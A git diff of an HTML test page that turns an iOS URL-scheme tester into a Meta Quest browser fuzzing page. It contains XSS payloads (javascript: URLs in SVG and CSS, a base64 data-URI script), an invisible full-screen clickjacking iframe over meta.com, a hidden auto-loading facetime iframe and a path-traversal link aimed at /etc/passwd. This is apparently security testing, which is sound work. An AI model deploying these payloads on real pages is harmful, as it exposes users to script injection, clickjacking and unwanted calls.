@@ -1,4 +1,5 @@
 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -13,55 +14,17 @@
   </style>
 </head>
 <body>
-
-    <h1>iOS URL Scheme Tester</h1>
-
-  <!-- Core system schemes -->
-  <a href="tel://+14048607545">📞 tel://+14048607545</a>
-  <a href="sms://+14048607545">💬 sms://+14048607545</a>
-  <a href="sms://?&body=HelloWorld">💬 sms:// with body</a>
-  <a href="mailto:test@example.com">✉️ mailto://test@example.com</a>
-  <a href="facetime://1234567890">🎥 facetime://</a>
-  <a href="facetime-audio://1234567890">🎧 facetime-audio://</a>
-
-  <!-- Obscure / lesser known -->
-  <a href="shoebox://">🎙️ shoebox:// (Voice Memos)</a>
-  <a href="shoebox://record">🎙️ shoebox://record</a>
-  <a href="com.apple.MobileAddressBook://">👥 com.apple.MobileAddressBook://</a>
-  <a href="prefs:root=General&path=About">⚙️ prefs:// (Deprecated)</a>
-  <a href="app-prefs:root=Bluetooth">📶 app-prefs://Bluetooth</a>
-
-  <!-- App Store -->
-  <a href="itms-apps://itunes.apple.com">🛒 itms-apps:// (App Store)</a>
-
-  <!-- Custom edge case test -->
-  <a href="tel://%2B14048607545">📞 tel:// with encoded number</a>
-  <a href="tel://@">📞 tel://@ (edge case)</a>
-
-  <p>Wall</p>
-<a href="shoebox://?id=1234">shoebox://?id=1234</a>
-<a href="shoebox://record?debug=true">shoebox://record?debug=true</a>
-<a href="shoebox://%2F..%2F..%2Fetc/passwd">shoebox://../etc/passwd</a>
-
-  <a href="shoebox://%2E%2E/">shoebox://%2E%2E/</a>
-<a href="shoebox://%F0%9F%92%B0">shoebox://💰</a>
-
-  <a href="shoebox://wallet">shoebox://wallet</a>
-<a href="shoebox://applepay">shoebox://applepay</a>
-
-  <iframe src="facetime://test@icloud.com" style="display:none"></iframe>
-  
-  <h1>Page</h1>
+  <h1>Meta Quest Browser Fuzz Testing Page</h1>
 
   <section>
-    <h2>1. SVG <code>&lt;use&gt;</code> Injection</h2>
+    <h2>SVG Use Injection</h2>
     <svg>
       <use xlink:href="javascript:alert('SVG Use Triggered')"></use>
     </svg>
   </section>
 
   <section>
-    <h2>2. CSS JavaScript URL Injection</h2>
+    <h2>CSS JavaScript Injection</h2>
     <style>
       @keyframes fuzz { from { background-image: url("javascript:alert('CSS triggered')"); } }
       .test-css { animation: fuzz 1s infinite; }
@@ -70,7 +33,7 @@
   </section>
 
   <section>
-    <h2>3. WebXR Request</h2>
+    <h2>WebXR Request</h2>
     <button onclick="startXR()">Request XR Session</button>
     <script>
       function startXR() {
@@ -86,11 +49,11 @@
   </section>
 
   <section>
-    <h2>4. Blob URI + Service Worker</h2>
+    <h2>Blob URI + Service Worker</h2>
     <button onclick="triggerBlob()">Trigger Blob Navigation</button>
     <script>
       if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('sw.js').then(() => {
+        navigator.serviceWorker.register('./sw.js').then(() => {
           console.log('SW registered');
         });
       }
@@ -103,21 +66,47 @@
   </section>
 
   <section>
-    <h2>5. Data URI XSS</h2>
+    <h2>Data URI XSS</h2>
     <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Data URI XSS Link</a>
   </section>
 
   <section>
-    <h2>6. UI Redress / Clickjacking Test</h2>
-    <p>This iframe should be hidden over the viewport. Try interacting with the screen to test frame isolation.</p>
+    <h2>UI Redress / Clickjacking Test</h2>
+    <p>This iframe should be hidden over the viewport.</p>
     <iframe src="https://www.meta.com/" style="opacity:0;position:absolute;top:0;left:0;width:100vw;height:100vh;"></iframe>
   </section>
 
   <section>
-    <h2>7. Browser Info</h2>
+    <h2>Browser Info</h2>
     <pre class="log" id="ua"></pre>
     <script>document.getElementById("ua").textContent = navigator.userAgent;</script>
   </section>
 
+  <section>
+    <h1>iOS URL Scheme Tester</h1>
+
+    <a href="tel://+14048607545">📞 tel://+14048607545</a><br>
+    <a href="sms://+14048607545">💬 sms://+14048607545</a><br>
+    <a href="sms://?&body=HelloWorld">💬 sms:// with body</a><br>
+    <a href="mailto:test@example.com">✉️ mailto://test@example.com</a><br>
+    <a href="facetime://1234567890">🎥 facetime://</a><br>
+    <a href="facetime-audio://1234567890">🎧 facetime-audio://</a><br>
+    <a href="shoebox://">🎙️ shoebox:// (Voice Memos)</a><br>
+    <a href="shoebox://record">🎙️ shoebox://record</a><br>
+    <a href="com.apple.MobileAddressBook://">👥 com.apple.MobileAddressBook://</a><br>
+    <a href="prefs:root=General&path=About">⚙️ prefs:// (Deprecated)</a><br>
+    <a href="app-prefs:root=Bluetooth">📶 app-prefs://Bluetooth</a><br>
+    <a href="itms-apps://itunes.apple.com">🛒 itms-apps:// (App Store)</a><br>
+    <a href="tel://%2B14048607545">📞 tel:// with encoded number</a><br>
+    <a href="tel://@">📞 tel://@ (edge case)</a><br>
+    <a href="shoebox://?id=1234">shoebox://?id=1234</a><br>
+    <a href="shoebox://record?debug=true">shoebox://record?debug=true</a><br>
+    <a href="shoebox://%2F..%2F..%2Fetc/passwd">shoebox://../etc/passwd</a><br>
+    <a href="shoebox://%2E%2E/">shoebox://%2E%2E/</a><br>
+    <a href="shoebox://%F0%9F%92%B0">shoebox://💰</a><br>
+    <a href="shoebox://wallet">shoebox://wallet</a><br>
+    <a href="shoebox://applepay">shoebox://applepay</a><br>
+    <iframe src="facetime://test@icloud.com" style="display:none"></iframe>
+  </section>
 </body>
 </html>
